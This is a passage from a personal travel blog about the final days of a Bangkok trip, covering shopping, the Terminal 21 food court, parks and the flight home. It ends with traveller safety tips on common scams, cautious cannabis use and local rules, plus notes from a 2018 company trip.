place is quite large, and like ICONSIAM, if you want to explore thoroughly, it could take a long time… I just casually bought a shirt.#### Big C![](/assets/b7e7c0938985/1*JNswfx_h01UuffS299HjgQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*GWD-HcYbLfAQEAN99tErsw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }After finishing at Central World, I walked across to Big C to buy snacks and souvenirs. (There are many options, but I don't think they are cheaper...)![](/assets/b7e7c0938985/1*Bda3BGHI_ZeylIS96UNcWg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI4ODYiIGhlaWdodD0iODg2Ij48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }![](/assets/b7e7c0938985/1*DWtvvjZ3iAwk5U3MPZDudg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI4ODYiIGhlaWdodD0iODg2Ij48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }![Bottom left Phutawan indoor diffuser was bought yesterday at Chatuchak, but I guess the department stores in the city also have it.](/assets/b7e7c0938985/1*aMillKlyevVx8fDncaurSA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0MDQiIGhlaWdodD0iNTIwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }The bottom left Phutawan indoor diffuser was bought yesterday at Chatuchak, but I guess the department stores in the city also have it.Additionally, Big C seems to no longer provide plastic bags, so you have to buy an eco-bag in the store.&gt; _That durian chips pack is large, but when opened, it only has two small bags inside… but they are quite tasty._#### Lunch![](/assets/b7e7c0938985/1*z4VW1WOelH7UjBco9PIAqg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*JsLSSg1m40v8aWJCmGkwzQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*52gtOpyDvYXZOMGlWs2akQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNDAwIiBoZWlnaHQ9Ijk2OSI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*qWWrZXa_LRClqCTi7bZK3Q.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMjAwIiBoZWlnaHQ9IjgxMCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }The outdoor plaza at Central World had a food market event. It’s not just a simple setup with tents and stalls; it has a theme, and this time it was Titanic. You can enter for free by following their official YouTube channel; the decorations inside were also very exquisite.![](/assets/b7e7c0938985/1*9iurlEySgDL-ZQZzVGDiug.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }But for lunch, we went back to SHAKE SHACK and ordered the chicken thigh burger this time, which was just as delicious.#### Afternoon: Returned to the hotel for a nap because I didn’t sleep well + hungover… I was really tired.#### Dinner at Terminal 21 Shopping Mall![](/assets/b7e7c0938985/1*8_lDD7yaIYIq7HV4zG4ClA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5NjYiIGhlaWdodD0iMTIwMCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*1T7njk_JYMi1eP1oMbjH-w.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*giNbQ1GPda-qPFaA8yQ7sQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }Terminal 21 is also a place where you can shop endlessly. Each floor has a different regional theme; for example, the Japan floor mainly sells Japanese products and restaurants.I mainly met up with [Chun-Hsiu Liu](https://medium.com/u/72361fccaa43){:target=\"_blank\"} at the food street upstairs for a meal. ( **A cheap and delicious dining spot that I highly recommend!** )![](/assets/b7e7c0938985/1*ZyuBXqyjZtLw5zyVmarw6w.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMjAwIiBoZWlnaHQ9IjgxMiI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }At the food street, you find your own seat, and many locals come here to eat as well.![](/assets/b7e7c0938985/1*a4MnqcM5Bi9jRPC3T29s5A.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*sYc87mPtI1nf3-9pk_F13w.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5ODYiIGhlaWdodD0iMTIwMCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }&gt; _⚠️ **The payment method here is that the vendors do not collect money directly. You need to go to the counter to exchange cash for a food card, and then use the food card QR code to pay; after eating, return to the counter for a refund. (No deposit or handling fee required)**_![](/assets/b7e7c0938985/1*rt81B-Pc31OZeMlgG5M38Q.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*k1vmadbwhdJsJNmkllarLQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }There are many choices; just line up, tell them your number, and use the food card QR code to pay; you can also take it to go (I remember there’s an additional THB 10 packaging fee).![](/assets/b7e7c0938985/1*Ol8uiQNEnE9tuZc-qbgqgQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }I ordered seafood fried instant noodles (THB 50) + pork chop with fries (THB 59) = THB 109.![](/assets/b7e7c0938985/1*t2R762mSI8CeoDWpSAuEKg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMjAwIiBoZWlnaHQ9IjkwMCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }After eating, I also took a box of mango sticky rice as a late-night snack back to the hotel.It was really delicious and cheap!!! A meal at a restaurant outside usually starts at THB 200–300, while here, most meals are around THB 50–80.![](/assets/b7e7c0938985/1*GLh1ljGJw3Z3H5WErje7OA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*nTn7bn41hh-hy5ix8EvL2g.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*G4G79vwVWj592tOApWbK2g.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }After eating, I went to the back to [Benjakitti Park](https://maps.app.goo.gl/bmKhQpbw9KTtLYeN8){:target=\"_blank\"} for a walk, hoping to find the legendary [Bangkok Monitor Lizard](https://tw.news.yahoo.com/%E5%B7%A8%E8%9C%A5%E4%BD%94%E9%A0%98%E5%A4%A7%E5%AD%B8-%E8%A2%AB%E5%B0%81%E6%B3%B0%E7%89%88%E4%BE%8F%E7%BE%8E%E5%9C%92-104942584.html){:target=\"_blank\"}; perhaps because it was nighttime, I didn’t see a single one.![](/assets/b7e7c0938985/1*0yDs1KBR3nYVbtvS9LvK4g.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*rcXtQT_INrL5UdH71tM1QA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5OTEiIGhlaWdodD0iMTIwMCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }&gt; **_⚠️ On the way back to the hotel, I encountered the legendary foreign scam: ⚠️_**&gt; **_While waiting for the BTS at the platform…_**&gt; _A person who looked Middle Eastern approached and struck up a conversation._&gt; _\\- Asked if I was Thai, if I spoke English, and then where I was from._&gt; _\\- I said Taiwan._&gt; _\\- He responded, \"Oh... Taiwan, I love Taiwan.\"_&gt; _But from his pronunciation, it was clear he didn’t really know Taiwan…_&gt; _\\- Then he said he wanted to exchange money but SuperRich was closed, asking how much Thai Baht I could get for 100 US dollars._&gt; _I found it suspicious and just ignored him and walked away…_&gt; `Their methods are quite similar; otherwise, they might ask what your country's currency looks like and if they can see it out of curiosity, then take the opportunity to pickpocket or snatch your money and run.`![](/assets/b7e7c0938985/1*LANMUj_RjuA6R4TF9FjjZg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*dMZhzj3rAqhRWAVuxeS0XQ.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }Back at the hotel, my travel companion bought some mangosteen to taste. I found the fresh ones delicious, with a light sweetness combined with the flavor of the mangosteen, very smooth. Later, I tried dried mangosteen, which didn’t taste as good; it was dry and sour.&gt; **_As for durians, the prices in Bangkok are not cheaper… a whole one is also THB 200 – 300._**### 8/06 Day 5 Return Trip#### Bangkok Monitor Lizard![](/assets/b7e7c0938985/1*6oX4YygURRzsrDmv_OAJ2Q.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*E0M71hXTtQmzl2YP6kgPtw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }In the morning, I was still hopeful and specifically went to [Lumphini Park](https://maps.app.goo.gl/n53FhsjXUUJLnghn6){:target=\"_blank\"} to look for the legendary Bangkok Monitor Lizard. Due to time constraints, I only found one medium-sized lizard that had just come out to sunbathe in the morning.&gt; _Looking for the monitor lizard was just a personal whim of mine; it is said that locals dislike these lizards (water monitors) because they eat dirty things, so it’s best not to touch them._#### 12:00 Back to the hotel to pick up luggage and head to the airportMy flight is at 15:20, so I need to leave around noon. It takes about an hour from the city center to the airport.&gt; _👉👉👉 You can refer to KKday's airport transfer service:_&gt; _[\\- Thailand | Airport Car Transfer | Suvarnabhumi Airport (BKK) / Don Mueang Airport (DMK) — Bangkok/Pattaya/Hua Hin City Hotels](https://www.kkday.com/zh-tw/product/3431-bkk-or-dmk-bangkok-private-transfer?cid=19365){:target=\"_blank\"}_&gt; _[\\- Bangkok Airport Transfer | Private Car from Bangkok City to Suvarnabhumi Airport (BKK)/Don Mueang Airport (DMK)](https://www.kkday.com/zh-tw/product/138989?cid=19365){:target=\"_blank\"}_![](/assets/b7e7c0938985/1*lw_D_aF2I9Hk1ZuCxTJa9w.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*BjN7psnpWGaZIXUjTyS2GA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*BPuL4q7P2JhBF5gow8wBwg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3MjAiIGhlaWdodD0iMTI4MCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }From the hotel, the Grab fare was THB 577, and we needed to take the highway; the driver would pay the toll first, and the final Grab charge would include the toll fee. (I remember it was about THB 50.)![](/assets/b7e7c0938985/1*ENH0G1_tBNWy-8RHV9XCag.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }The checked baggage limit was only 15 kg, and I managed to keep it under control.![](/assets/b7e7c0938985/1*1OxUScqXRNomuUfNRXQo9g.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*3RQf2Vl_yNnbGqN1s7-AqA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNDAwIiBoZWlnaHQ9IjE1NDUiPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9ImdyZXkiLz48L3N2Zz4=\" }BKK's gate guardian.![](/assets/b7e7c0938985/1*oBzwNLYNeu3yiCQNd5cvKw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5OTIiIGhlaWdodD0iMTIwMCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*eTEGYVJWr25O5A2Jkjgqiw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }After clearing immigration around 13:20, the security checks at Bangkok airport were quite strict. Everything had to go through security, and almost all carry-on bags had to be opened for manual inspection.After going through immigration and security, I had about an hour to grab a bite; I found a Thai restaurant to enjoy my last meal in Thailand. \\(Seafood fried rice, mango juice, mango sticky rice\\).&gt; _Mango sticky rice is available in takeout boxes at many shops after leaving the country, so if you can't get enough, you can buy some to eat on the plane!_&gt; _**\\(⚠️ But remember, it's prohibited to bring it back to Taiwan ⚠️\\)**_![](/assets/b7e7c0938985/1*ouwulscC2q0OsIujIa2iXg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }This bottle of water deserves a close-up because the budget airline doesn't provide anything, so I thought I'd buy water at the airport to drink on the flight, but after going through immigration, bottled water costs THB 70 — 100, and this one was THB 100.![](/assets/b7e7c0938985/1*rXfw5dbuYOFCumEd7ku_Dw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*rOoff9qAZL6L4LjXH4DNfw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI4MzUiIGhlaWdodD0iMTIwMCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }BKK is huge... filled with Trip\\.com advertisements. My return flight was on time, so I took the shuttle bus to the terminal.#### Back to Taiwan![](/assets/b7e7c0938985/1*mcP927WXYhpjG-Mqw3a-PA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI1NTMiIGhlaWdodD0iMTIwMCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*cch3UQonXmhb31oqYlrCcw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*asUAWDh4hGhI4rn2_XfO0g.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }Arriving at TPE Taiwan Taoyuan International Airport, I collected my luggage and headed out around 20:45, directly taking the `1841` or `1819` Kuo-Kuang Motor Transport back to Taipei, which was very convenient without needing to transfer.### ⚠️ Safety and Precautions for Traveling in Bangkok, Thailand ⚠️The most important thing when going out is safety, so I've compiled some safety tips and precautions.#### Scam Prevention[] (https://www.youtube.com/watch?v=o42r-bg16Fg){:target=\"_blank\"}The following is a summary based on a video by the Bangkok Cat, and I actually encountered a currency exchange scam this time.1. Incorrect calculations It may not be intentional; you can calculate the total amount when ordering.2. Someone approaches you wanting to see your country's currency or asking if you want to exchange money When you pull out your wallet, they might steal or pickpocket.3. Outside the Grand Palace or attractions, they falsely claim the attraction is closed and enthusiastically suggest taking a tuk-tuk to other places \\(black temples/black shops/ **I encountered a private boat scam at the pier this time**\\).4. Tuk-tuks, outrageous pricing, suddenly increasing the fare halfway If you want to experience a tuk-tuk but are afraid of being overcharged, [you can try the new MUVMI app for tuk-tuk rides](https://bkk.com.tw/muvmi-app/){:target=\"_blank\"}. Even if a tuk-tuk looks good, be wary of scam 3, where they enthusiastically suggest going to attractions or taking a boat.5. Fake staff, while waiting in line, fake staff may enthusiastically invite you inside They will introduce the menu in your language, help you order, and then say you need to pay upfront, taking your money and running.6. Motorcycle rental scams Do not leave your passport as a deposit, do not leave your passport as a deposit, do not leave your passport as a deposit. If you encounter malicious scams claiming damages and asking for compensation, leaving your passport can lead to trouble. It's better to find a reputable rental company, and take a video of the vehicle's condition before renting.7. Local dating app scams You might end up meeting a ladyboy, a scammer, or worse.8. Patpong ping pong show scams, where enthusiastic touts ask if you want to see a ping pong show, claiming you only need to buy a drink for 100 THB, then take you into a dark alley or a shady second-floor establishment. It's hard to leave, and when you want to go, they demand 3,000 THB, claiming there was no 100 THB deal.9. Be cautious of pickpockets in crowded places, even in areas where you need to buy tickets to enter \\(e.g., Grand Palace, Wat Pho\\).#### 🌿🚬Next year it will be banned, but I can share some experiences.- **⚠️⚠️⚠️ Edibles (like gummies) have a strong effect, and the scary part is that when you eat them, they feel just like regular gummies, and the effects can suddenly hit you a few hours later ⚠️⚠️⚠️**- It's best to try gradually, eat 1/3... wait a few hours... if nothing happens, eat 2/3... wait a few hours... feel a little something, then try eating 1 whole piece...- Smoking also depends on your body, so it's best to start gradually.- **⚠️⚠️⚠️ No matter what, I strongly recommend trying it only in your hotel; if you get high, you can rest directly, which is safer ⚠️⚠️⚠️**- Just because you drink doesn't mean you can handle it better.- **⚠️⚠️⚠️** Your heart rate may increase and feel uncomfortable **⚠️⚠️⚠️**- It's safer to have someone awake to take care of you if needed.- Only smoke in specific situations.#### Other- Thailand is not a tipping culture, generally, you don't need to tip; I only tip THB 20 for massages as a token gesture.- Alcohol sales are only allowed from 11:00 AM to 2:00 PM and from 5:00 PM to midnight; sales are prohibited all day on Buddhist holidays.- Hotel balconies may not allow smoking, so it's best to ask.- The emergency assistance phone number for foreigners is `1155`.- SuperRich has business hours, so if you arrive too early or too late, you won't be able to exchange money.### Appendix — 2018 Digital Technology Bangkok Huahin 5-Day Employee Trip&gt; _Just some memories and itineraries for reference; details may not be accurate._![Digital Technology 2018 Employee Trip](/assets/b7e7c0938985/1*VURDGpK5oFdfh7tPE09Ofw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijc2OCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }Digital Technology 2018 Employee Trip&gt; **_⚠️ The following are all photos and records from 2018, for reference only ⚠️_**&gt; **_⚠️ The following are all photos and records from 2018, for reference only ⚠️_**&gt; **_⚠️ The following are all photos and records from 2018, for reference only ⚠️_**### Day 1#### [Moai Cafe, Easter Island Giant Stone Statue Cafe](https://maps.app.goo.gl/URymiZfGGrM8KFmY7){:target=\"_blank\"} \\(Closed\\)![](/assets/b7e7c0938985/1*2LAaIKpScW8aqlJ3xHBMnw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/b7e7c0938985/1*gINRuaBCC2a3HB41dJVUng.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }A colleague \\(2024\\) also mentioned that Bangkok has many, many Instagrammable cafes, all very extravagant. Friends interested can check them out; this one had low ratings and is now closed.#### Dinner — [Chom View Seafood Restaurant](https://maps.app.goo.gl/LVVRnpUEfozXxAfM6){:target=\"_blank\"}![](/assets/b7e7c0938985/1*wISYae5A69QJI_iuKfOdXg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMTAyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" 